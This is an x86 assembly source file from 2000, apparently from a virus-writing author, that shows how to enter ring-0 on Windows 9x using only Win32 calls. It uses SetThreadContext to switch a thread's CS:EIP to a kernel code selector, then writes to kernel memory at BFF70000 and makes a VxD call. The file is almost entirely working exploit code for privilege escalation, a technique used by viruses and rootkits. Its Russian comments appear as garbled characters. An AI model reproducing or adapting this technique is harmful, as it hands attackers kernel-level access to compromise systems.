
; EXAMPLE of entering RING-0 using ONLY Win32 API (changing context)
; action: invert DWORD at BFF70000.

; variant 2: with correct exit from ring-0

; (x) 2000 Z0MBiE, http://z0mbie.cjb.net


include                 consts.inc

callW                   macro   x
                        extern  x:PROC
                        call    x
                        endm

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

r3_finished             db      0
r0_finished             db      0

save_esp                dd      ?
old_eip                 dd      ?
old_cs                  dd      ?

thread1_handle          dd      ?
thread1_id              dd      ?

thread1_context:
c_contextflags          dd      -1
c_dr0                   dd      ?
c_dr1                   dd      ?
c_dr2                   dd      ?
c_dr3                   dd      ?
c_dr6                   dd      ?
c_dr7                   dd      ?
c_fpu_controlword       dd      ?
c_fpu_statusword        dd      ?
c_fpu_tagword           dd      ?
c_fpu_erroroffset       dd      ?
c_fpu_errorselector     dd      ?
c_fpu_dataoffset        dd      ?
c_fpu_dataselector      dd      ?
c_fpu_registerarea      db      80 dup (?)
c_fpu_cr0npxstate       dd      ?
c_gs                    dd      ?
c_fs                    dd      ?
c_es                    dd      ?
c_ds                    dd      ?
c_edi                   dd      ?
c_esi                   dd      ?
c_ebx                   dd      ?
c_edx                   dd      ?
c_ecx                   dd      ?
c_eax                   dd      ?
c_ebp                   dd      ?
c_eip                   dd      ?
c_cs                    dd      ?
c_eflags                dd      ?
c_esp                   dd      ?
c_ss                    dd      ?

; r0 stack
                        even
                        db      1024 dup (?) ; should be in committed page
end_of_my_stack:

                        .code
start:

; ᮧ���� ����� ����
                        push    offset thread1_id       ; ptr to threadid
                        push    0                       ; creation flags
                        push    0                       ; parameter
                        push    offset thread1_r3_code  ; eip
                        push    0                       ; stacksize
                        push    0                       ; security attribs
                        callW   CreateThread
                        mov     thread1_handle, eax

; ������� ���⥪�� (ॣ�����) ���
                        push    offset thread1_context  ; ptr to context
                        push    thread1_handle          ; thread handle
                        callW   GetThreadContext

; �������� ���⥪�� - ��⠭����� CS:EIP �� ��� ��� �㫥���� �����

                        mov     eax, 28h                ; CS:
                        xchg    eax, c_cs
                        mov     old_cs, eax

                        lea     eax, thread1_r0_code    ; EIP
                        xchg    eax, c_eip
                        mov     old_eip, eax

; �ਬ����� ��������� ���⥪��
                        push    offset thread1_context  ; ptr to context
                        push    thread1_handle          ; thread handle
                        callW   SetThreadContext

; ��������� ����砭�� ࠡ��� ���
__waitcycle:            cmp     r3_finished, 1
                        jne     __waitcycle

                        int 3

; ��室 � ������
__exit:                 push    -1
                        callW   ExitProcess

; ��砫�� ��� ��� ���쥣� ����;
; ��� �ࠢ����� 㩤�� � kernel � � ring-0 -- �� ���㤠 㦥 �� ��୥���,
; ⠪ ��� CS:EIP ������ ���� ��������.
thread1_r3_code:

__cycle:                push    1
                        callW   Sleep

                        cmp     r0_finished, 1
                        jne     __cycle

                        mov     r3_finished, 1

                        push    -1
                        callW   ExitThread

; ��� �㫥���� �����
thread1_r0_code:
                        int 3

                        mov     ss:save_esp, esp
                        lea     esp, end_of_my_stack

                        pushf
                        pusha
                        push    ds es

                        push    ss ss
                        pop     ds es

                        not     dword ptr ds:[0BFF70000h] ; ��襬 � ��୥�

                        VxDcall VXDLDR, GetDeviceList

                        nop
                        nop

                        mov     r0_finished, 1 ; ��⮢�

                        pop     es ds
                        popa
                        popf

                        mov     esp, ss:save_esp

                        pushf
                        push    ss:old_cs
                        push    ss:old_eip
                        iret

                        end     start
